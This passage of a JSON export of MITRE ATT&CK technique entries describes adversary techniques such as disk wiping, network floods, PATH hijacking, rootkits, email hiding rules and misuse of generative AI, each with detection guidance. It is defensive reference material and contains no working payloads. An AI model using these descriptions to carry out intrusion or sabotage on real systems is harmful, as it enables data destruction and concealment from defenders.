      "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1561.002",
      "stix_id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
      "created": "2020-02-20T22:10:20.484000+00:00",
      "modified": "2025-04-15T19:58:04.838000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Driver: Driver Load",
        "Drive: Drive Modification",
        "Drive: Drive Access",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.\n\nFor network infrastructure devices, collect AAA logging to monitor for `format` commands being run to erase the file structure and prevent recovery of the device."
    },
    "T1498.001": {
      "id": "T1498.001",
      "name": "Direct Network Flood",
      "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1498.001",
      "stix_id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
      "created": "2020-03-02T20:07:18.651000+00:00",
      "modified": "2025-04-15T22:19:07.343000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Sensor Health: Host Status"
      ],
      "defense_bypassed": [],
      "detection": "Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation."
    },
    "T1574.007": {
      "id": "T1574.007",
      "name": "Path Interception by PATH Environment Variable",
      "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.007",
      "stix_id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
      "created": "2020-03-13T14:10:43.424000+00:00",
      "modified": "2025-04-15T19:58:05.096000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
    },
    "T1213.002": {
      "id": "T1213.002",
      "name": "Sharepoint",
      "description": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1213.002",
      "stix_id": "attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a",
      "created": "2020-02-14T13:35:32.938000+00:00",
      "modified": "2025-04-15T23:07:18.929000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Application Log: Application Log Content",
        "Cloud Service: Cloud Service Metadata"
      ],
      "defense_bypassed": [],
      "detection": "The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. \n\n"
    },
    "T1006": {
      "id": "T1006",
      "name": "Direct Volume Access",
      "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1006",
      "stix_id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
      "created": "2017-05-31T21:30:20.934000+00:00",
      "modified": "2025-04-15T19:58:05.272000+00:00",
      "platforms": [
        "Network Devices",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Drive: Drive Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)\n\nMonitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging of PowerShell scripts is recommended."
    },
    "T1588.007": {
      "id": "T1588.007",
      "name": "Artificial Intelligence",
      "description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) \n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1656), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)\n",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1588.007",
      "stix_id": "attack-pattern--0cc222f5-c3ff-48e6-9f52-3314baf9d37e",
      "created": "2024-03-11T13:37:31.836000+00:00",
      "modified": "2025-04-15T19:58:05.447000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of generative artificial intelligence (i.e. [Phishing](https://attack.mitre.org/techniques/T1566), [Phishing for Information](https://attack.mitre.org/techniques/T1598))."
    },
    "T1666": {
      "id": "T1666",
      "name": "Modify Cloud Resource Hierarchy",
      "description": "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.  \n\nIaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources)\n\nAdversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022)\n\nIn AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1666",
      "stix_id": "attack-pattern--0ce73446-8722-4086-9d43-514f1d0f669e",
      "created": "2024-09-25T14:16:19.234000+00:00",
      "modified": "2025-04-15T22:49:45.874000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1564.008": {
      "id": "T1564.008",
      "name": "Email Hiding Rules",
      "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.008",
      "stix_id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
      "created": "2021-06-07T13:20:23.767000+00:00",
      "modified": "2025-04-15T22:27:09.849000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Application Log: Application Log Content",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries.\n\nOn Windows systems, monitor for creation of suspicious inbox rules through the use of the <code>New-InboxRule</code> and <code>Set-InboxRule</code> PowerShell cmdlets.(Citation: Microsoft BEC Campaign) On MacOS systems, monitor for modifications to the <code>RulesActiveState.plist</code>, <code>SyncedRules.plist</code>, <code>UnsyncedRules.plist</code>, and <code>MessageRules.plist</code> files.(Citation: MacOS Email Rules)"
    },
    "T1491.002": {
      "id": "T1491.002",
      "name": "External Defacement",
      "description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1491.002",
      "stix_id": "attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3",
      "created": "2020-02-20T14:34:08.496000+00:00",
      "modified": "2025-04-15T22:34:21.584000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "File: File Modification",
        "File: File Creation",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation."
    },
    "T1027.013": {
      "id": "T1027.013",
      "name": "Encrypted/Encoded File",
      "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.013",
      "stix_id": "attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144",
      "created": "2024-03-29T12:38:17.135000+00:00",
      "modified": "2025-04-15T19:58:05.840000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1590.005": {
      "id": "T1590.005",
      "name": "IP Addresses",
      "description": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1590.005",
      "stix_id": "attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3",
      "created": "2020-10-02T15:59:11.695000+00:00",
      "modified": "2025-04-15T22:40:30.211000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1499.001": {
      "id": "T1499.001",
      "name": "OS Exhaustion Flood",
      "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1499.001",
      "stix_id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
      "created": "2020-02-20T15:27:18.581000+00:00",
      "modified": "2025-04-15T22:53:56.462000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Sensor Health: Host Status"
      ],
      "defense_bypassed": [],
      "detection": "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts."
    },
    "T1014": {
      "id": "T1014",
      "name": "Rootkit",
      "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1014",
      "stix_id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
      "created": "2017-05-31T21:30:26.496000+00:00",
      "modified": "2025-04-16T20:37:15.308000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Drive: Drive Modification",
        "Firmware: Firmware Modification",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)"
    },
    "T1546.013": {
      "id": "T1546.013",
      "name": "PowerShell Profile",
      "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.013",
      "stix_id": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3",
      "created": "2020-01-24T15:11:02.758000+00:00",
      "modified": "2025-04-15T19:58:06.292000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet)(Citation: Microsoft Profiles) Example profile locations (user defaults as well as program-specific) include:\n\n* <code>$PsHome\\Profile.ps1</code>\n* <code>$PsHome\\Microsoft.{HostProgram}_profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1</code>\n\nMonitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs."
    },
    "T1059.007": {
      "id": "T1059.007",
      "name": "JavaScript",
      "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.007",
      "stix_id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
      "created": "2020-06-23T19:12:24.924000+00:00",
      "modified": "2025-04-15T22:43:16.394000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Process: Process Creation",
        "Script: Script Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
